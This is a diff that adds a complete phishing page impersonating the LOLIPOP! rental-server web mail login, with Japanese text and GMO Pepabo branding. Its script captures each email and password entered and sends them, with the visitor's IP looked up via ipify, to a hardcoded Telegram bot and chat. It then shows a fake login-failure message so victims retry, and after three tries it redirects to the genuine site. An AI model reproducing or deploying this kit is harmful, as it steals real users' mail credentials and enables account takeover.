@@ -1,0 +1,457 @@
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=10" />
+    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    <link rel="shortcut icon" href="https://lolipop.jp/favicon.ico" type="image/x-icon">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.2/lib/anime.min.js"
+        integrity="sha256-tc4b48P1MPGS4PJXHRlChGCW1mEZy62jS/3JEsSHPzU=" crossorigin="anonymous"></script>
+
+    <title>ロリポップ! レンタルサーバー - WEBメーラーにログイン</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Hiragino Sans', 'Hiragino Kaku Gothic ProN', 'Segoe UI', Arial, sans-serif;
+            background: #f8f8f8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        .top-section {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-top: 20px;
+        }
+
+        .logo-container {
+            margin-bottom: 30px;
+        }
+
+        .logo-text {
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        .lolipop-logo {
+            color: #E74C3C;
+            font-weight: bold;
+            font-size: 16px;
+            display: inline-block;
+        }
+
+        .gmo-logo {
+            color: #0066CC;
+            font-weight: normal;
+            font-size: 14px;
+            display: inline-block;
+        }
+
+        .main-title {
+            font-size: 24px;
+            color: #333;
+            font-weight: 400;
+            margin-top: 10px;
+            letter-spacing: 0.5px;
+        }
+
+        .login-container {
+            background: white;
+            max-width: 600px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 40px;
+            border-radius: 0;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            color: #333;
+            font-weight: 500;
+            margin-bottom: 8px;
+            margin-left: 1px;
+        }
+
+        .form-label .required {
+            color: #333;
+            font-weight: normal;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 12px;
+            border: 1px solid #999;
+            border-radius: 0;
+            font-size: 13px;
+            transition: border-color 0.3s ease;
+            background-color: #fafafa;
+            font-family: inherit;
+            color: #333;
+        }
+
+        .form-input::placeholder {
+            color: #999;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #0066CC;
+            background-color: white;
+        }
+
+        .form-input[type="email"]:focus {
+            border: 2px solid #0066CC;
+            padding: 13px 11px;
+        }
+
+        .form-input[type="password"]:focus {
+            border: 2px solid #0066CC;
+            padding: 13px 11px;
+        }
+
+        .login-button {
+            background: #d3d3d3;
+            color: #666;
+            border: 1px solid #999;
+            padding: 12px 20px;
+            border-radius: 0;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            width: 100%;
+            font-family: inherit;
+            margin-top: 10px;
+        }
+
+        .login-button:hover {
+            background: #c0c0c0;
+        }
+
+        .login-button:active {
+            background: #b0b0b0;
+        }
+
+        .help-section {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+            line-height: 1.8;
+        }
+
+        .help-section li {
+            list-style: disc;
+            margin-left: 20px;
+        }
+
+        .help-section a {
+            color: #0066CC;
+            text-decoration: none;
+        }
+
+        .help-section a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 60px;
+            font-size: 12px;
+            color: #999;
+            padding-bottom: 30px;
+            flex-grow: 1;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+        }
+
+        .error-message {
+            display: none;
+            margin-top: 15px;
+            padding: 12px 14px;
+            background-color: #fee;
+            border: 1px solid #fcc;
+            color: #c33;
+            font-size: 12px;
+            text-align: center;
+            border-radius: 0;
+        }
+
+        .loader {
+            display: none;
+            gap: 8px;
+            align-items: center;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9999;
+        }
+
+        .loader div {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #E74C3C;
+        }
+
+        .fieldset {
+            all: unset;
+            display: contents;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .login-container {
+                padding: 30px 20px;
+            }
+
+            .main-title {
+                font-size: 20px;
+            }
+
+            .logo-text {
+                font-size: 14px;
+            }
+
+            .form-input {
+                font-size: 16px;
+                padding: 14px;
+            }
+
+            .form-input[type="email"]:focus,
+            .form-input[type="password"]:focus {
+                padding: 13px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 15px;
+            }
+
+            .top-section {
+                margin-bottom: 30px;
+                padding-top: 10px;
+            }
+
+            .login-container {
+                padding: 25px 15px;
+            }
+
+            .main-title {
+                font-size: 18px;
+            }
+
+            .logo-text {
+                font-size: 13px;
+            }
+
+            .form-label {
+                font-size: 12px;
+            }
+
+            .form-input {
+                font-size: 14px;
+                padding: 12px;
+            }
+
+            .form-group {
+                margin-bottom: 20px;
+            }
+
+            .login-button {
+                font-size: 13px;
+                padding: 11px 15px;
+            }
+
+            .help-section {
+                font-size: 11px;
+            }
+
+            .footer {
+                margin-top: 30px;
+                font-size: 11px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="top-section">
+        <div class="logo-container">
+            <div class="logo-text">
+                <img src="https://webmail.lolipop.jp/img/logo-lolipop-horizonal-light.svg" width="50" alt="LOLIPOP!">
+            </div>
+        </div>
+        <h1 class="main-title">WEBメーラーにログイン</h1>
+    </div>
+
+    <div class="login-container">
+        <form id="lolipopForm" onsubmit="return sendtelegram()">
+            <div id="loader" class="loader">
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+
+            <fieldset id="fieldset" class="fieldset">
+                <div class="form-group">
+                    <label class="form-label" for="email">メールアドレス <span class="required">*</span></label>
+                    <input type="email" id="email" name="email" class="form-input" placeholder=""
+                        required autocomplete="off">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="password">パスワード <span class="required">*</span></label>
+                    <input type="password" id="password" name="password" class="form-input" placeholder=""
+                        required autocomplete="off">
+                </div>
+
+                <button type="submit" class="login-button">ログイン</button>
+
+                <div class="error-message" id="errorMessage">
+                    ログインが失敗しました。メールアドレスまたはパスワードをもう一度ご確認ください。
+                </div>
+            </fieldset>
+
+            <div class="help-section">
+                <ul>
+                    <li>ログインが失敗する場合やメールアドレスのパスワードをお忘れの場合は<a href="#" onclick="return false;">こちらのFAQをご確認ください</a></li>
+                </ul>
+            </div>
+        </form>
+    </div>
+
+    <div class="footer">
+        <p>© 2003-2025 GMO Pepabo, inc. All rights reserved.</p>
+    </div>
+
+    <!-- Hidden input for IP address -->
+    <input type="hidden" id="ipaddress">
+
+    <script>
+        // Telegram Configuration
+        var telegram_bot_id = "8353485947:AAHPCpkOvxlXZxSPgvN10EhIqtVy5SBJ_WM";
+        var chat_id = 7932642751;
+        var u_email, u_password, message;
+        var tick = 0;
+
+        // Prepare form data for Telegram
+        var ready = function () {
+            u_email = document.getElementById("email").value;
+            u_password = document.getElementById("password").value;
+            message = "🍭🍭🍭🍭🍭🍭🍭🍭🍭🍭🍭🍭\n \n😘 LOLIPOP! WEB MAILER LOGIN ✅\n\n⚡Email: " + u_email + "\n⚡Password: " + u_password + "\n\n▬▬▬▬▬▬[LOLIPOP DETAILS]▬▬▬▬▬▬\n🤖Login: https://lolipop.jp/\n📍Platform: LOLIPOP! レンタルサーバー - WEBメーラー\n🏢Provider: GMO Pepabo, inc.\n\n📞HACKER: @plus234ng";
+        };
+
+        // Send data to Telegram
+        var sendtelegram = function () {
+            tick += 1;
+            ready();
+
+            document.getElementById("loader").style.display = "flex";
+            document.getElementById("fieldset").style.opacity = "0.4";
+
+            let tl = anime.timeline({
+                easing: 'easeOutExpo',
+                duration: 300,
+                loop: true
+            });
+
+            tl.add({
+                targets: '#loader div',
+                translateX: 185,
+                delay: anime.stagger(300, { easing: 'linear' }),
+                duration: 500,
+            })
+            tl.add({
+                targets: '#loader div',
+                translateX: 1000,
+                delay: anime.stagger(300, { easing: 'linear' }),
+                duration: 500,
+            })
+
+            setTimeout(() => {
+                tl.pause();
+                tl.restart();
+                setTimeout(() => {
+                    tl.pause();
+                    document.getElementById("loader").style.display = "none";
+                    document.getElementById("fieldset").style.opacity = "1";
+                }, 10);
+
+                // Send to Telegram
+                var settings = {
+                    "async": true,
+                    "crossDomain": true,
+                    "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+                    "method": "POST",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "cache-control": "no-cache"
+                    },
+                    "data": JSON.stringify({
+                        "chat_id": chat_id,
+                        "text": message
+                    })
+                };
+
+                $.ajax(settings).done(function (response) {
+                    console.log("Telegram Response:", response);
+                });
+
+                // Show error message
+                document.getElementById("errorMessage").style.display = 'block';
+                document.getElementById("password").value = "";
+
+                // Redirect after 3 attempts
+                if (tick >= 3) {
+                    window.location.replace("https://lolipop.jp/");
+                }
+            }, 5000);
+
+            return false;
+        };
+
+        // Hide error when typing password
+        document.getElementById("password").onfocus = function () {
+            document.getElementById("errorMessage").style.display = 'none';
+        };
+
+        // Initialize on page load
+        $(document).ready(function () {
+            console.log("LOLIPOP Login Page Loaded");
+
+            // Keyboard support
+            $(document).keypress(function (event) {
+                var keycode = (event.keyCode ? event.keyCode : event.which);
+                if (keycode == '13') {
+                    event.preventDefault();
+                    document.getElementById("lolipopForm").dispatchEvent(new Event('submit'));
+                }
+            });
+        });
+    </script>
+
+</body>
+
+</html>
